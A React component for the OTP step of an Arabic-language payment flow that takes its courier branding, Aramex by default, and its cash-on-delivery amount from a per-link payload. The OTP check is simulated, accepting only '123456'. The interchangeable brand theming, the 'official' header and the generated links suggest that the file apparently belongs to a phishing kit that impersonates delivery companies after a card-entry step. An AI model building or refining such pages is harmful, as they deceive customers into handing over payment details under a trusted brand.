import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { useLink } from "@/hooks/useSupabase";
import { Shield, ArrowLeft, RotateCcw } from "lucide-react";
import { useTheme } from "@/themes/ThemeContext";

const PaymentOTPOfficial = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const { theme } = useTheme();

  const serviceKey = linkData?.payload?.service_key || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const shippingInfo = linkData?.payload as any;

  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isVerifying, setIsVerifying] = useState(false);

  // Get amount from shipping info
  const rawAmount = shippingInfo?.cod_amount || 500;
  const amount = typeof rawAmount === 'string' ? parseFloat(rawAmount) : rawAmount;

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setIsVerifying(true);

    // Simulate OTP verification
    setTimeout(() => {
      if (otp === "123456") {
        navigate(`/pay/${id}/receipt`);
      } else {
        setError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
      }
      setIsVerifying(false);
    }, 1500);
  };

  const handleResend = () => {
    alert("تم إرسال رمز جديد إلى رقم هاتفك");
  };

  const handleBack = () => {
    navigate(`/pay/${id}/card`);
  };

  return (
    <div
      className="min-h-screen"
      style={{
        background: 'var(--color-background)',
        fontFamily: 'var(--font-family)',
      }}
    >
      {/* Official Company Header */}
      <header
        className="sticky top-0 z-50 w-full border-b"
        style={{
          backgroundColor: 'var(--color-surface)',
          borderBottomColor: 'var(--color-border)',
          height: 'var(--header-height)',
          padding: 'var(--header-padding)',
          boxShadow: 'var(--header-box-shadow)',
        }}
      >
        <div className="container mx-auto h-full flex items-center justify-between">
          <div className="flex items-center gap-3 sm:gap-4">
            <button onClick={handleBack} className="p-2 hover:bg-gray-100 rounded-full transition-colors">
              <ArrowLeft className="w-5 h-5" style={{ color: 'var(--color-text)' }} />
            </button>
            <img
              src={theme?.logo}
              alt={serviceName}
              className="h-8 sm:h-12 w-auto object-contain"
            />
          </div>
          <div className="text-right">
            <h1 className="text-lg sm:text-xl font-bold" style={{ color: 'var(--color-text)' }}>
              {serviceName}
            </h1>
            <p className="text-xs sm:text-sm" style={{ color: 'var(--color-text-secondary)' }}>
              التحقق من الهوية
            </p>
          </div>
        </div>
        {/* Brand Bar */}
        <div
          className="h-1 w-full"
          style={{
            background: 'var(--gradient)',
          }}
        />
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-6 sm:py-8">
        <div className="max-w-2xl mx-auto">
          {/* Progress Indicator */}
          <div
            className="mb-6 sm:mb-8 p-4 sm:p-6 rounded-lg border"
            style={{
              backgroundColor: 'var(--color-surface)',
              borderColor: 'var(--color-border)',
            }}
          >
            <div className="flex items-center justify-between mb-3">
              <span
                className="text-sm font-semibold"
                style={{ color: 'var(--color-text)' }}
              >
                الخطوة 4 من 4
              </span>
              <span
                className="text-xs"
                style={{ color: 'var(--color-text-secondary)' }}
              >
                {serviceName}
              </span>
            </div>
            <div className="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
              <div
                className="h-full rounded-full transition-all duration-500"
                style={{
                  width: '100%',
                  background: 'var(--gradient)',
                }}
              />
            </div>
          </div>

          {/* OTP Form */}
          <form onSubmit={handleVerify}>
            <div
              className="border rounded-xl p-6 sm:p-8 mb-6"
              style={{
                backgroundColor: 'var(--color-surface)',
                borderColor: 'var(--color-border)',
                borderRadius: 'var(--card-border-radius)',
                padding: 'var(--card-padding)',
                border: 'var(--card-border)',
              }}
            >
              <h2
                className="text-xl font-bold mb-2 text-center"
                style={{ color: 'var(--color-text)' }}
              >
                أدخل رمز التحقق
              </h2>
              <p
                className="text-sm mb-6 text-center"
                style={{ color: 'var(--color-text-secondary)' }}
              >
                تم إرسال رمز التحقق إلى رقم هاتفك
              </p>

              <div className="space-y-6">
                {/* OTP Input */}
                <div>
                  <label
                    className="block text-sm font-semibold mb-3 text-center"
                    style={{ color: 'var(--color-text)' }}
                  >
                    رمز التحقق (OTP)
                  </label>
                  <div className="relative max-w-md mx-auto">
                    <input
                      type="text"
                      placeholder="123456"
                      value={otp}
                      onChange={(e) => setOtp(e.target.value.replace(/[^0-9]/g, ""))}
                      maxLength={6}
                      className="w-full px-6 py-4 border-2 rounded-lg text-lg text-center font-bold tracking-[0.5em] transition-all focus:outline-none focus:ring-2"
                      style={{
                        borderColor: error ? '#E31837' : 'var(--color-primary)',
                        fontFamily: 'var(--font-family)',
                        '--tw-ring-color': 'var(--color-primary)',
                      } as React.CSSProperties}
                    />
                    <Shield
                      className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5"
                      style={{ color: 'var(--color-text-secondary)' }}
                    />
                  </div>
                  {error && (
                    <p className="text-sm mt-3 text-center" style={{ color: '#E31837' }}>
                      {error}
                    </p>
                  )}
                </div>

                {/* Security Info */}
                <div
                  className="flex items-start gap-3 p-4 rounded-lg border"
                  style={{
                    backgroundColor: `rgba(var(--color-primary-rgb), 0.08)`,
                    borderColor: `rgba(var(--color-primary-rgb), 0.3)`,
                  }}
                >
                  <Shield className="w-5 h-5 flex-shrink-0 mt-0.5" style={{ color: 'var(--color-primary)' }} />
                  <div>
                    <div
                      className="font-semibold text-sm mb-1"
                      style={{ color: 'var(--color-text)' }}
                    >
                      أمان إضافي
                    </div>
                    <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                      رمز التحقق صالح لمدة 5 دقائق فقط. لا تشارك هذا الرمز مع أي شخص.
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Verify Button */}
            <button
              type="submit"
              disabled={otp.length !== 6 || isVerifying}
              className="w-full text-white font-bold py-4 sm:py-5 px-6 rounded-lg transition-all duration-300 hover:shadow-lg active:scale-[0.98] flex items-center justify-center gap-2 text-sm sm:text-base disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
              style={{
                background: 'var(--gradient)',
                padding: 'var(--button-padding)',
                borderRadius: 'var(--button-border-radius)',
                fontWeight: 'var(--button-font-weight)',
                textTransform: 'var(--button-text-transform)',
                fontFamily: 'var(--font-family)',
              }}
            >
              {isVerifying ? (
                <>
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  <span>جارٍ التحقق...</span>
                </>
              ) : (
                <>
                  <Shield className="w-5 h-5" />
                  <span>تأكيد الرمز</span>
                </>
              )}
            </button>

            {/* Resend OTP */}
            <div className="text-center mt-6">
              <button
                type="button"
                onClick={handleResend}
                className="inline-flex items-center gap-2 px-4 py-2 rounded-lg border transition-all hover:bg-gray-50 text-sm font-semibold"
                style={{
                  color: 'var(--color-primary)',
                  borderColor: 'var(--color-primary)',
                  fontFamily: 'var(--font-family)',
                }}
              >
                <RotateCcw className="w-4 h-4" />
                إعادة إرسال الرمز
              </button>
            </div>
          </form>
        </div>
      </main>
    </div>
  );
};

export default PaymentOTPOfficial;
